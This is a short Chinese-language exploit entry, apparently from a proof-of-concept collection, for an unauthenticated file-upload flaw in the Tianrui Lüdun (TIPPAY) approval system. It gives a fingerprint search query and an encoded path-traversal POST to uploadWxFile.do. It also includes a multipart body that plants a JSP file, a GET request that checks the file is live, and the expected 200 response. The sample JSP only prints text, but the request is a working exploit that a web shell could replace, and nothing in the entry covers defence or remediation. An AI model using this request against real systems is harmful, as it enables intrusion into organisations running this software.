# 天锐绿盾审批系统uploadWxFile文件上传漏洞

- **系统**：天锐绿盾　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="TIPPAY-绿盾审批系统"`
- **请求**：`POST /trwfe/service/.%2E/config/uploadWxFile.do HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlA…`

**请求体 / payload**
```
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="file"; filename="hello.jsp"
Content-Type: application/octet-stream
<% out.println("HelloWorld");%>
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
GET /hello.jsp HTTP/1.1
Host:
```
- **预期**：200　|　—